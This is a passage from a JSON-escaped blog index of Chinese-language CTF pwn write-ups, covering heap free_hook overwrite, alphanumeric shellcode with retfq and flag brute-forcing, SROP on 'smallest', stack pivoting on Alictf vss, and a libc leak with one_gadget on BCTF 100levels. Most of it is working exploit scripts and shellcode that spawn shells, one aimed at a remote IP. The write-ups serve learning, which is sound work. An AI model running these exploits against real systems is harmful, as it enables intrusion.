delete(3)\n    delete(8)\n    delete(19)\n    add(0x4e8-1,p64(0x30)*8+p64(0x30)+p64(0x31)+p64(free_hook))\n    add(0x28-1,\"padding\")\n    add(0x28-1,p64(system_addr))\n    delete(0)\n    p.interactive()\n    #add(0x18-1,\"A\")\n    #add(0x18-1,\"B\")\n    #delete(0)\n    #add(0x18-1,p64(0x0)*2+(\"\\x30\"+\"\\x20\").ljust(8,\"\\x00\"))\n    #pause()\n\n\n\ni = 0\nwhile True:\n    i += 1\n    print i\n    #p = process(binary)\n    #p = process(binary, env={\"LD_PRELOAD\":\"./libc-2.31.so\"})\n    p = remote(\"8.140.114.72\",1399)\n    try:\n        pwn()\n        p.recv(timeout = 0.5) \n        #要么崩溃要么爆破成功，若崩溃io会关闭，io.recv()会触发   EOFError\n        EOFError\n    except EOFError:\n        p.close()\n        continue\n    else:\n        sleep(0.1)\n        p.sendline(\"1\")\n        pause()\n        break\n```\n\n \n\n二、shellcode：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-24_16-43-10.png)\n\n只有系统号0x9,0x5,0x25,0x0,0xe7才能正常被执行，而0x5在32位下是open，即可以利用到open，mmap，和read函数。对于ORW少了一个W，可以使用flag的逐个字符比较的方法来爆破出flag。由于切换retfq需要涉及到构造32位的栈地址，所以这里最好还是用mmap来申请指定位置的一片空间，从而劫持栈。\n\n(1)mmap的设置：\n\n```python\nshellcode_mmap = '''\n/*mmap(0x40404040,0x7e,,0x7,0x22,0,0)*/\nxor rax,rax\n\n/*set rdx*/\nmov al,0x7\npush rax\npop rdx\n\n/*set rcx*/\nmov al,0x22\npush rax\npop rcx\n\n/*set rdi*/\nxor rdi,rdi\nmov edi,0x40404040\n\n/*set rsi*/\nmov al,0x7e\npush rax\npop rsi\n\n/*set rax*/\nmov al,0x9\n\n/*set r8,r9*/\nxor r8,r8\nxor r9,r9\n\nsyscall\n'''\n```\n\n这里由于对输入字符做了限制，只能是可见字符，同时由于这里使用alpha3这个工具来将shellcode编码成可见字符。但是这个工具有一个缺点，就是不能出现\\x00这个字符，所以如果我们使用mov rax,0x9则使得0x9在64位是0x0000000000000009，存在\\x00字符，所以需要用到al,dl,等8位寄存器，来转换一下。\n\n(2)read的设置：\n\n```python\nshellcode_read = '''\n/*read(0,0x40404040,0x70)*/\nxor rax,rax\nxor rdi,rdi\nxor rsi,rsi\nmov esi,0x40404040\nxor rdx,rdx\nmov dl,0x70\nsyscall\n'''\n```\n\n读入到之前用mmap开辟的空间0x40404040处。\n\n(3)retfq的设置：\n\n```python\nshellcode_retfq = '''\nmov esp,0x40404440\npush 0x23\npush 0x40404040\nretfq\n'''\n```\n\n①需要32位的栈，同时劫持esp，使得栈上的完全可控，防止push出错。\n\n②这里0x23为转32位，0x33为转64位。\n\n③push 0x40404040是在retfq之后跳转的地方，需要放到栈上。\n\n▲汇编点：存在xor,mov,retfq多的时候，需要是：shellcode_x64 = asm(shellcode_x64,arch = 'amd64',os='linux')才行。\n\n以上的很多不太知道原理，具体的在具体用到时候再改。\n\n(4)orw中的or设置：\n\n```python\nshellcode_open = '''\nmov eax, 5\npush 0x67616c66\nmov ebx, esp\nxor ecx, ecx\nint 0x80\nmov ecx, eax\n'''\n\nshellcode_to64 = '''\npush 0x33\npush 0x4040402b\nretfq\n'''\n\nshellcode_read_flag = '''\nmov rdi,rcx\nmov rsi,rsp\nmov rdx,0x70\nxor rax,rax\nsyscall\n'''\n```\n\n(5)爆破的汇编代码设置：\n\n```python\nif flag_pos == 0:\n    shellcode = \"cmp byte ptr[rsp+{0}], {1}; jz $-4; ret\".format(flag_pos, ch)\nelse:\n    shellcode = \"cmp byte ptr[rsp+{0}], {1}; jz $-5; ret\".format(flag_pos, ch)\n```\n\n这里的ch即为循环的可见字符，flag_pos是读出flag的对应位置，但是原理就是将读取的flag遍历比较所有可见字符，相等则使得程序跳入循环中，然后就可以通过设置timeout为某个值来判断这个字符是否相等，相等则加入到flag中。类似的有：\n\n```python\ncheck = '''\nmov dl, byte ptr [rsi+{}]\nmov cl, {}\ncmp cl,dl\njz loop\nmov al,231\nsyscall\nloop:\njmp loop\n'''.format(reloc,ch)\n```\n\n这里就用到了exit_group，另外rsp,rsi,甚至rbx都可以的，因为读取之后这三个寄存器都保存了flag的值：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-24_22-28-12.png)\n\n(6)汇总：\n\n```python\n#注释头\n\nfrom pwn import * \n\nshellcode_open = '''\n    mov eax, 5\n    push 0x67616c66\n    mov ebx, esp\n    xor ecx, ecx\n    int 0x80\n    mov ecx, eax\n    '''\n\nshellcode_to64 = ''' \n    push 0x33\n    push 0x4040405b\n    retfq\n'''\n\nshellcode_read_flag = '''\n    mov rdi,rcx\n    mov rsi,rsp\n    mov rdx,0x70\n    xor rax,rax\n    syscall\n'''\n\nshellcode_open = asm(shellcode_open)\nshellcode_to64 = asm(shellcode_to64,arch = 'amd64',os = 'linux')\nshellcode_read_flag = asm(shellcode_read_flag,arch = 'amd64',os = 'linux')\n\n\ndef pwn(p, flag_pos, ch):\n        payload = \"Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103e4A070c7o4D0c1P0n0x0R3X8P0t140p2C4A2N1P005p0q1M0c3c2u194Y7o0q0y154008135L1L0p3T400q2p0p0p1M0A3r3S0A0B053O0s2G0r051k2z1l2y0w2O0p093k0y\"\n        p.sendline(payload)\n        sc = asm('''\n        mov dl, byte ptr [rsi+{}]\n        mov cl, {}\n        cmp cl,dl\n        jz loop\n        mov al,231\n        syscall\n        loop:\n        jmp loop\n        '''.format(flag_pos,ch),arch = 'amd64',os = 'linux')\n\n        if flag_pos == 0:\n            shellcode = \"cmp byte ptr[rsp+{}], {}; jz $-4; ret\".format(flag_pos, ch)\n        else:\n            shellcode = \"cmp byte ptr[rsp+{}], {}; jz $-5; ret\".format(flag_pos, ch)\n        check = asm(shellcode, arch='amd64', os='linux')\n\n        payload = shellcode_open + shellcode_to64 + shellcode_read_flag + check \n        #pause()\n        p.send(payload)\n        #pause()\n\nmy_flag = \"\"\nflag_pos = 0\nwhile True:\n    for ch in range(33, 127):\n        #p = remote(\"39.105.137.118\", 50050)\n        p = process(\"./shellcode\")\n        try:\n            print(ch)\n            pwn(p, flag_pos, ch)\n            p.recvline(timeout=3.0)\n            my_flag = my_flag + chr(ch)\n            print(\"=>\", my_flag)\n            flag_pos += 1\n            p.close()\n            break\n        except EOFError:\n            ch += 1\n            p.close()\n    if(my_flag[-1] == '}'):\n        break\nlog.info(\"flag:%s\"%my_flag)\n```\n\n \n\n \n\n \n","tags":["比赛"],"categories":["PWN"]},{"title":"360ichunqiu 2017-smallest","url":"/2021/08/14/360ichunqiu 2017-smallest/","content":"\n1.常规checksec，开了一个NX，没办法shellcode。IDA打开查看程序，找漏洞，有个屁的漏洞，只有一个syscall的系统调用，各种栈操作也没有。\n\n2.观察这个系统调用，系统调用参数通过edx,rsi,rdi赋值，edx直接被赋值为400h，buf对应的rsi被rsp赋值，系统调用号fd对应的rdi被rax赋值。再查看汇编代码，有xor rax,rax，所以rax一定是0，那么这个syscall系统调用的就是read函数，读取的数取直接存入栈顶。由于buf大小为400h，且只有一个syscall，之后直接retn，没有leave指令，这就代表了rsp指向的地址就是我们执行完syscall后start函数retn的返回地址(pop eip)。也就是如果输入一个地址，读取完之后，通过retn就会跳转到该地址中。另外程序中除了retn之外没有其它对栈帧进行操作的指令，如果输入多个syscall地址，就可以反复执行syscall。并且最开始输入400h字节，程序流完全可控。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527242.jpeg)\n\n3.首先想到rop，但是题目没给Libc，并且通过调试发现，这个程序压根就没导入外部的Libc库，IDA中打开没有extern，完全没办法常规rop，那么想用SROP。远程调试一下查看堆栈数据，发现临时创建的smallest段数据没有可写权限，能够利用的只有[stack]栈数据。所以这里需要先泄露一个栈地址来让我们能够往栈中写入数据binsh从而调用execve(‘/bin/sh\\x00’，0，0)来直接getshell。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527471.jpeg)\n\n4.之后观察栈上的数据，发现当运行到syscall时，rsp下方的内容全是栈上的地址。![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527913.jpeg)\n\nrbp一直都是0x000......这是因为程序只有一个start函数，根本就没有为函数再次创建栈，所用的只是最初生成的栈空间。根据这个原理，我们可以通过系统调用sys_write函数，来打印rsp指向的内容，也就是某个栈地址，这样就成功泄露栈地址。\n\n5.但是sys_write的调用号是1，而通过调试发现rax的初始值被默认设置为0，并且程序中没有任何修改rax的代码。唯一一个也只有xor   rax, rax，但是任何数和本身异或的结果都是0，所以如果程序每次都从这行代码执行，那么执行的系统调用号永远都是0，也就是会无限循环read。这里想到由于栈完全可控，并且输入一个地址，程序执行完这个地址对应的函数后retn会直接跳转到rsp的下一行。这里选择让程序再执行一次sys_read函数，之后我们为其中一次输入一个字节，并且这次返回不再从xor这行代码开始执行，从mov rsi, rsp开始。由于sys_read的返回值自动写回给rax(一般函数的返回值都会写给rax)，所以读取几个字节read就向rax写入多少，这样就会使得rax也可以得到控制，不再被xor为0，调用我们想调用的系统函数。\n\n6.所以编写payload:先尝试一下看能否泄露栈地址，test1.py\n\n```\n#注释头\n\npayload = \"\"\npayload += p64(start_addr)\npayload += p64(set_rsi_rdi_addr)\npayload += p64(start_addr)\n#泄露栈地址之后返回到start，执行下一步操作。\nio.send(payload)\nsleep(3)\nio.send(payload[8:8+1])\n```\n\n\\#利用sys_read随便读取一个字符，设置rax = 1，由于retn关系，rsp下拉了一个单位，所以这里会读入到原先的rsp+0x8处，也就是从原先的Payload中第8个字符开始，抽取一个字符，就是set_rsi_rdi_addr的最后一个字节，为了不改变返回地址。如果写成：io.send(‘\\xb8’)效果一样，都是为了不改变返回地址。之后再执行set_rsi_rdi_addr从而执行write函数，\n\n```\n#注释头\n\nstack_addr = u64(io.recv()[8:16]) + 0x100\n#从最初的rsp+0x10开始打印400字节数据，那么从泄露的数据中抽取栈地址，+0x100防止栈数据过近覆盖\nlog.info('stack addr = %#x' %(stack_addr))\n```\n\n7.这里可以看到成功泄露了一个栈地址，但是不能再用简单读入binsh字符串之后设置SigreturnFrame结构体来getshell，因为这里设置读入地址是通过rsp设置的。如果将rsp设置为我们想读入binsh的栈地址，那么肯定是可以读入binsh字符串的，但是当程序运行到retn时，跳转的是binsh这个地址，这是不合法的，没办法跳转，程序会崩溃。\n\n这里就考虑使用SigreturnFrame()来进行栈劫持，将整个栈挪移到目的地。\n\n(1)首先布置SigreturnFrame()的栈空间，进行栈劫持：\n\n```\n#注释头\n\nframe_read = SigreturnFrame() \n#设置read的SROP帧，不使用原先的read是因为可以使用SROP同时修改rsp，实现stack pivot\nframe_read.rax = constants.SYS_read#调用read读取payload2\nframe_read.rdi = 0#fd参数\nframe_read.rsi = stack_addr#读取payload2到rsi处\nframe_read.rdx = 0x300#读取长度为0x300\n#读取的大小\nframe_read.rsp = stack_addr#设置SROP执行完的rsp位置\n#设置执行SROP之后的rsp为stack_addr，里面存的是start_addr，retn指令执行后从start开始。\nframe_read.rip = syscall_addr#设置SROP中的一段代码指令\n```\n\n(2)发送payload。\n\n```\n#注释头\n\npayload1 = \"\"\npayload1 += p64(start_addr)#读取payload[8:8+15]，设置rax=0xf0\npayload1 += p64(syscall_addr)#利用rax=0xf0,调用SROP\npayload1 += str(frame_read)\nio.send(payload1)\nsleep(3)\nio.send(payload1[8:8+15])\n#为rax赋值为0xf0\nsleep(3)\n```\n\n程序运行SROP过程中，会执行read函数，将payload2读取到stack_addr处，所以当程序运行完SROP后，栈顶rsp被劫持到stack_addr处，同时stack_addr上保存的内容是payload2，首地址是start，所以retn执行后仍旧从start开始。\n\n(3)设置第二次的SigreturnFrame攻击：\n\n```\n#注释头\n\nframe_execve = SigreturnFrame()\n#设置execve的SROP帧，注意计算/bin/sh\\x00所在地址\nframe_execve.rax = constants.SYS_execve\nframe_execve.rdi = stack_addr+0x108\nframe_execve.rip = syscall_addr\n```\n\n这里的0x108是计算出来的，需要计算从stack_addr到rdi，也就是binsh字符串的距离。由于传进去的是结构体，大小为0xf8。前一个例子中binsh字符串是放在str(frameExecve)之前，所以没有那么大。这里却是放在str(frame_execve)之后，所以从stack_addr为起始，start_addr，syscall_addr，frame_execve)，总共为0xf8+0x08*2=0x108，这里不太懂可以调试一下看看。也就是再一次start_addr读取字符串binsh的位置。\n\n8.发送payload，读取binsh字符串，getshell：\n\n```\n#注释头\n\npayload2 = \"\"\npayload2 += p64(start_addr)#处在stack_addr处，读取payload[8:8+15]，设置rax=0xf0\npayload2 += p64(syscall_addr)#处在stack_addr+0x08,利用rax=0xf0,调用SROP\npayload2 += str(frame_execve)#处在stack_addr+0x10\npayload2 += \"/bin/sh\\x00\"#处在stack+0x108处\nio.send(payload2)\nsleep(3)\nio.send(payload2[8:8+15])\nsleep(3)\nio.interactive()\n```\n\n9.尝试使用mprotect为栈内存添加可执行权限x，从而shellcode来getshell。\n\n(1)第一段的劫持栈和读取payload2进入劫持栈处都是一样的\n\n```\n#注释头\n\nframe_read = SigreturnFrame()#设置read的SROP帧\nframe_read.rax = constants.SYS_read\nframe_read.rdi = 0\nframe_read.rsi = stack_addr\nframe_read.rdx = 0x300\nframe_read.rsp = stack_addr\n#读取payload2，这个stack_addr地址中的内容就是start地址，SROP执行完后ret跳转到start\nframe_read.rip = syscall_addr\n```\n\n(2)第二段需要调用mprotect来修改权限：\n\n```\n#注释头\n\nframe_mprotect = SigreturnFrame()\n#设置mprotect的SROP帧，用mprotect修改栈内存为RWX\nframe_mprotect.rax = constants.SYS_mprotect\nframe_mprotect.rdi = stack_addr & 0xFFFFFFFFFFFFF000\nframe_mprotect.rsi = 0x1000\nframe_mprotect.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC\n#权限为R,W,X\nframe_mprotect.rsp = stack_addr\n#劫持栈地址rsp\nframe_mprotect.rip = syscall_addr\n```\n\n(3)最后的shellcode:\n\n```\n#注释头\n\npayload2 = \"\"\npayload2 += p64(stack_addr+0x10) #处在stack_addr\n#SROP执行完后，ret到stack_addr+0x10处的代码，即执行shellcode\npayload2 += asm(shellcraft.amd64.linux.sh())#处在stack_addr+0x10\nio.send(payload2)\nsleep(3)\nio.interactive()\n```\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["SROP"],"categories":["PWN","SROP0x8"]},{"title":"pwnable.kr-login","url":"/2021/08/14/Alictf 2016-vss/","content":"\n1.常规checksec,开了NX保护，IDA打开找漏洞，发现程序特别奇怪，没有main函数，这里应该是把elf文件的符号信息给清除了。正常情况下编译出来的文件里面带有符号信息和调试信息，这些信息在调试的时候非常有用，但是当文件发布时，这些符号信息用处不大，并且会增大文件大小，这时可以清除掉可执行文件的符号信息和调试信息，文件尺寸可以大大减小。可以使用strip命令实现清除符号信息的目的。\n\n2.虽然这里找不到main函数，但是start函数是一定会存在的，由于start按F5反汇编不成功，所以这里进入到start函数的汇编代码中：\n\n由于start中的结构基本固定，最后基本上都是如下，所以这里sub_4011B1其实就是main函数，这里就可以点进去看了。\n\n```\n#注释头\n\nmov     rdi, offset main\ncall    _libc_start_main\n```\n\n2.这里的main函数可以反汇编成功，那么就开始分析漏洞。第一个函数是sub_4374E0，进去之后如下\n\n```\n#注释头\n\nsigned __int64 result; // rax\nresult = 37LL;\n__asm { syscall; LINUX - sys_alarm }\n```\n\n使用系统调用号37，也就是0x25，代表alarm。\n\n3.sub_408800字符串单参数，且参数都被打印到屏幕上，可以猜测是puts。sub_437EA0调用sub_437EBD，并且fd参数位为0号，且接收三个参数，看下汇编代码：\n\n```\n#注释头\n\nmov       eax, 0\nsyscall;  LINUX - sys_read\n```\n\n调用0号syscall，推测为read函数。(系统调用号有)\n\n4.进入sub_40108E函数中分析，这个函数处理了我们的输入，可以说就是关键函数了。看半天啥也没看懂，直接上调试。先输入十几个A看看，发现经过sub_400330函数之后，内存中输入的A，也就是a1处的内容被复制到了v2，这里先猜测是个类似strncpy函数的东西。然后看内容，既然局部变量v2只有0x40,而这个复制函数的的参数有80,也就是0x50，多了0x10。那么再调试看看，输入0x48个字节A，发现sub_40108E函数的ebp被我们改掉了：\n\nsub_400330((__int64)&v2, a1, 80LL);\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191549889.jpeg)\n\n但是程序接着运行下去却不太行，陷入了循环，然后一直运行后崩溃，连之后的read(v8, (__int64)&v3, 40LL);这段read代码都没有运行。\n\n5.再观察下程序，有个代码有意思：\n\n```\n#注释头\n\nsub_400330((__int64)&v2, a1, 0x50LL);\nif ( (_BYTE)v2 == 'p' && BYTE1(v2) == 'y' )\n    return 1LL;\n```\n\n在复制完字符串之后进入一个判断语句，如果开头是py，就直接retn，不经过下面代码，所以我们完全可以在这就直接返回。但是这里有个问题，这个return有没有汇编指令里的leave操作呢，如果没有，那rsp仍然在最前面，不会跳转到返回地址的地方，看汇编代码，可以看到最后是通过判断后跳转到了locret_40011AF，而这段地址里就是leave和retn的汇编操作，能够将rsp拉到返回地址处，那直接return就完事了。![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191550236.jpeg)\n\n6.那么这里就可以判断出来我们的输入会被复制到v2这个局部变量中，并且最多0x50，也就是说除开rbp，我们可以再控制一个该函数的返回地址。那么开始尝试呗。由于只有一个返回地址，没有后门程序，最先想到的肯定是onegadget，但是不知道libc版本，没办法onegadget。那只有一个返回地址可以做什么，那么只有栈劫持了。其它WP大多都是抬高rsp，我想可不可以降低rsp，通过一次payload来getshell，也就是通过ROPgadget搜索sub rsp，但是搜出来的都不太行，要么太大，超过0x50，要么就很奇怪。然后一般栈劫持需要一个ret来接着控制程序流，这里也没搜到。同时由于使用的复制函数经过调试就是strncpy，字符串里不能有\\x00，否则会被当做字符串截断从而无法复制满0x50字节制造可控溢出，这就意味着任何地址(因为地址基本都会在最开始带上00)都不能被写在前0x48个字节中，彻底断了sub rsp的念想。所以还是抬高栈吧。但是抬高栈也有点问题，就是我们输入的被复制的只有0x50个字节，抬高有啥用，不可控啊。然后就想到之前的read函数，读了400个字节，而紧接着就是调用该函数。刚好局部变量v2第一个被压栈，与sub_40108E函数栈的栈底紧紧挨在一起，也就是说越过sub_40108E函数栈的栈底和返回地址就可以直接来到main函数栈。而main函数栈中又只有一个我们输入的局部变量v4，所以sub_40108E函数栈的返回地址之后的第一个地址就是我们输入的局部变量v4的地址。(这里通过调试也可以发现)\n\n7.那么经过计算，其实只要有一个pop,ret操作，让rsp抬高一下就可以到达我们输入的首地址。但是由于经过前面分析，我们需要在程序开头输入py来使得该函数直接return，那么如果只是一个pop,ret操作，那么程序第一个执行的代码就是我们输入的开头，包含了py的开头，这就完全不可控了，开头如果是py那怎么计算才能是一个有效地址呢。\n\n8.那么就只能查找add rsp，只要满足add rsp 0x50之上就可以完全操控了。这里至少需要0x50也是因为这是strncpy，不能将地址写到前0x48个字节，否则会截断，而最后返回地址的覆盖可以被完全复制是这里本来就是一个返回地址，保存的内容应该是00401216，也就是之前call sub_40108E的下一段地址。这里在复制的时候肯定被截断了，但是由于本来就是找到一个可用的地址，截断了覆盖的也只是将401216换成了add rsp 0x58;ret这个地址(如果我们的add rsp的有效地址地方包含了00，那指定会出错)。那么payload的语句应该是payload = \"py\" + \"a\"*(0x48-0x02) + add_rsp_addr + padding + 实际控制代码。\n\n9.利用ROPgadget搜索add esp的相关内容，可以查到一个地址0x46f205，操作是add rsp, 0x58; ret，这样就可以顺利将栈抬升到0x58的地方，所以payload的组成应该是：payload = “py” + “a”*0x46 + p64(0x46f205) + “a”*8 + p64(addr2)+...(a*8是用来填充的，因为抬升到了0x58处，复制之后0x50处是一段空白地方，所以还需要填充一下使p64(addr2)能顺利被抬升至0x58处被执行)。后面的p64(addr2)和...就是我们的常规gadget操作了。\n\n10.现在需要system函数和/bin/sh字符串了。没有Libc，system函数和/bin/sh也没有，所以这里需要输入/bin/sh字符串，然后system函数需要通过syscall来实现。(64位程序下是syscall函数，32位程序下就是Int 0x80)\n\n11.这里先完成binsh的输入：payload = p64(pop_rdx) + p64(rdx_value) + p64(pop_rsi) + p64(rsi_value) + p64(pop_rdi) + p64(rdi_value) + p64(pop_rax)+ p64(rax_value) + p64(syscall)因为是64位程序，函数从左往右读取参数所取寄存器依次为：rdi，rsi，rdx, rcx, r8, r9, 栈传递，但是实际情况中是从右往左读取参数，也就是当只有三个参数时，读取顺序应该是rdx,rsi,rdi对应的为read(rdi,rsi,rdx)。\n\n这里rdx是输入的大小，rsi是输入的内存地址buf(随便找一段可读可写的就行了)，rdi是fd标志位，由于是通过syscall调用，所以除了配置三个read函数参数还需要配置系统调用号，也就是rax的传参为0x0。![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191549806.jpeg)这里如果不使用syscall，其实也可以用我们之前猜出来的read函数的plt表，只是这样就可以不用设置rax了。\n\n▲这里不能使用401202处的call read，因为call会压入下一行代码的作为read返回地址，那样就不可控了。这里选择系统调用是因为没有read在got表中的真实地址，不然其实调用got表地址也可以。\n\n \n\n12.接着调用system函数，同样采用syscall系统调用，需要几个参数的设置rax=59,rdx=0,rsi=0,（这是调用syscall必须的前置条件，因为是linux规定的，可以上网查一下就知道）。都可以通过Pop gadget来实现，之后传参rdi为&buf，最后调用即可getshell。(59为系统调用号)所以紧接着的payload = p64(pop_rax) + p64(rax_value) + p64(pop_rdx) + p64(rdx_value) + p64(pop_rsi) + p64(rsi_value) + p64(pop_rdi) + p64(rdi_value) + p64(syscall)![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191549760.jpeg)这里就必须的设置rax为0x3b了。\n\n▲sh不能用来传给syscall开shell，但是int 0x80可以。syscall-64，int 0x80-32。\n\n▲syscall是在上进入内核模式的默认方法x86-64。该指令在Intel处理器的 32位操作模式下不可用。sysenter是最常用于以32位操作模式调用系统调用的指令。它类似于syscall，但是使用起来有点困难，但这是内核的关注点。int 0x80 是调用系统调用的传统方式，应避免使用，是32位程序下的。\n\n系统调用查询网址：https://syscalls.w3challs.com/\n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n\n \n","tags":["hijackStack"],"categories":["PWN","hijackStack0x4"]},{"title":"BCTF 2017-100levels","url":"/2021/08/14/BCTF 2017-100levels/","content":"\n1.常规checksec，开启了NX和PIE，不能shellcode和简单rop。之后IDA打开找漏洞，E43函数中存在栈溢出漏洞：\n\n```\n#注释头\n\n__int64 buf; // [rsp+10h] [rbp-30h]\n--------------------------------------------------\nread(0, &buf, 0x400uLL);\n```\n\n有栈溢出那么首先想到是应该查看有没有后门，但是这个程序虽然外部引用了system函数，但是本身里并没有导入到.got.plt表中，没办法直接通过.got.plt来寻址。而且开了PIE，就算导入到.got.plt表中，也需要覆盖返回地址并且爆破倒数第四位才能跳转到system函数。虽然有栈溢出，但是没有后门函数，同样也没办法泄露Libc地址。\n\n2.想getshell，又只有一个栈溢出，没有其它漏洞，还开了PIE和NX，那么一定得泄露出地址才能做，而printf地址也因为PIE没办法直接跳转。陷入卡顿，但是这里可以查看E43函数中的printf的汇编代码：\n\n只能通过栈溢出形式来为下一次的printf赋参数来泄露。又由于PIE，也不知道任意一个函数的代码地址，那也没办法泄露被加载进入Libc中的内存地址。\n\n3.通过调试可以看到，进入E43函数中，抵达printf函数时，栈顶的上方有大量的指向libc的地址：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532908.png)\n\n并且观察E43函数中的汇编代码，可以看到Printf是通过rbp取值的，那么我们可以通过栈溢出修改rbp来使得[rbp+var_34]落在其它地方，而如果这个其它地方有libc地址，那么就相当于泄露出了Libc地址。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532014.jpeg)\n\n4.这个关卡数是由我们设置的，而且通过递归调用E43函数，形成多个E43的栈，那么进行调试，第二次进入E43的栈之后，仍然在运行到printf函数时，栈顶上方仍旧有大量的Libc地址。由于我们需要修改rbp来使得下一次的printf打印出libc地址，那么关卡最低需要设置两关，第一关用来栈溢出，修改rbp，使得第二关中的printf函数指向栈顶上方从而打印出Libc地址。\n\n5.由于栈的随机化，我们如果随意修改rbp那么就会打印出奇怪的东西，所以修改rbp的最后一个字节，使得[rbp+var_34]能够移动一定范围，以一定几率命中栈顶上方。而又由于是递归调用，第一关的栈在第二关的栈的上方，模型大致如下：\n\n(1)第一次rbp和rsp以及第二次的如图：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532743.png)  ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532872.png)\n\n(2)第一次栈以及第二次栈如图：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532846.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532270.png)\n\n▲这里用的是Libc-2.32的，用其他的Libc就不太一样，具体情况具体分析。\n\n6.这里的模型是假设第一次的rsp栈顶后两位为00，但是由于栈地址随机化，所以rsp其实可以从0x00-0xFF之间变化，对应的地址也就是从0-31之间变化。\n\n7.这里先考虑第一个问题，rbp-var34如何落到libc空间中，也就是当0往下移动，变化为大约是4或者5时，即可落到libc空间。同样的，从5-16变化，都可以使得rbp-var34落在libc空间。但是如果0变化成16以上，对应的第二次栈空间rbp就会变成32以上，换算成16进制为0x100，这时修改最后两位，就会变成0x15c，使得它不但不往上走，更会往下走，从而没办法落到libc空间。总而言之，慢慢研究下，然后计算概率大约为12/32=3/8，可以使得落在Libc空间。这里的5c可以改变成其它值x，但是需要x-0x34为8的倍数才行，不然取到的地址会是截断的，但是修改后成功概率会发生改变，因为0x5c扫到的地址范围大概就是libc的栈空间。\n\n8.落在libc空间不代表一定就会落在指向Libc地址上，前面可以看到，在16个地址范围内大概为7个，也就是1/2的概率成功。然后由于有v2%a1这个运算，也就对应汇编代码idiv   [rbp+var_34]，这就导致如果rbp+var_34的数据为0那么就会产生除零操作，这里没办法去掉。需要进行try操作来去除这个错误，使程序重新运行，进行自动化爆破。同时泄露出来的地址会发现有时候是正数有时候是负数。这是因为我们只能泄露出地址的低32位，低8个十六进制数。而这个数的最高位可能是0或者1，转换成有符号整数就可能是正负两种情况。这里进行处理可避免成功率下降：\n\n```\n#注释头\n\nif addr_l8 < 0:\naddr_l8 = addr_l8 + 0x100000000\n```\n\n9.但是泄露出来的地址由于printf的参数是%d，所以打印出来的是32位地址，还需要猜剩下32位。但是这里有个技巧，貌似所有64程序加载后的代码段地址都在0x000055XXXXXXXXXX-0x000056XXXXXXXXXX之间徘徊，对应的libc加载段在0x00007EXXXXXXXXXX-0x00007FXXXXXXXXXX范围，以下是测试数据：\n\n程序开头段.load首地址和debug段首地址：\n\n```\n#注释头\n\n00007F1301D2A000  \n000056238FCAB000\n差值为28EF 7207 F000\n\n00007FCB31061000\n000055D513E06000\n差值为29F6 1D25 B000\n\n00007F58EFF09000\n000055F7C1BEC000\n差值为2983 DC10 3000\n```\n\n具体原理好像是PIE源代码随机的关系，但具体不太清楚，能用就行。所以高32位就可以假设地址为0x00007fxx，所以这里需要爆破0x1ff大小，也就是511，相当于512次，但是其实可以知道，大概率是落在0x7f里，看数据分析也可以知道，所以实际爆破次数基本在500次以内。所以将泄露出来的地址加上一个在0x7f里的值，也就是addr = addr_l8 + 0x7f8b00000000，之后再根据Libc空间中指向libc地址的后两位来区分地址：并减去在libc中查到的偏移量即可得到Libc基地址。\n\n```\n#注释头\n\nif hex(addr)[-2:] == '0b': #__IO_file_overflow+EB\nlibc_base = addr - 0x7c90b\n\nelif hex(addr)[-2:] == 'd2': #puts+1B2\nlibc_base = addr - 0x70ad2\n\nelif hex(addr)[-3:] == '600':#_IO_2_1_stdout_\nlibc_base = addr - 0x3c2600\n\nelif hex(addr)[-3:] == '400':#_IO_file_jumps\nlibc_base = addr - 0x3be400\n\nelif hex(addr)[-2:] == '83': #_IO_2_1_stdout_+83\nlibc_base = addr - 0x3c2683\n\nelif hex(addr)[-2:] == '32': #_IO_do_write+C2\nlibc_base = addr - 0x7c370 - 0xc2\n\nelif hex(addr)[-2:] == 'e7': #_IO_do_write+37\nlibc_base = addr - 0x7c370 - 0x37\n```\n\n所以算上命中概率，其实调试的时候可以看到，第一关的栈空间中由于程序运行结果也会有几个指向Libc地址，加上这几个也可以提高成功率，因为修改的rbp也是有可能落在第一关的栈空间。总的爆破次数应该就是500/((1/2)*(3/8))，约为2500次，还能接受。\n\n10.泄露出Libc地址之后一般就有两种方法，一种是利用栈溢出，调用万能gadget用system函数进行binsh字符串赋值，从而getshell。还有一种就是，利用one_gadget来getshell，通过查看E43返回时的汇编代码有一个move eax,0；满足libc-2.23.so的其中一个one_gadget的条件，那么直接用就行。\n\n11.最后libc基地址加上one_gadget的偏移地址就可以得到one_gadget的实际地址。\n\none_gadget = libc_base + 0x45526\n\n之后在第二关中再次进行栈溢出覆盖rip来跳转到one_gadget即可getshell。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["PIE"],"categories":["PWN","PIE0x7"]},{"title":"BSides San Francisco CTF 2017-b_64_b_tuff","url":"/2021/08/14/BSides San Francisco CTF 2017-b_64_b_tuff/","content":"\n \n\n1.常规checksec下，只开了NX，之后IDA打开文件之后，有如下语句：\n\n```\n#注释头\n\ns = (char *)base64_encode((int)buf, v7, v5);\n((void 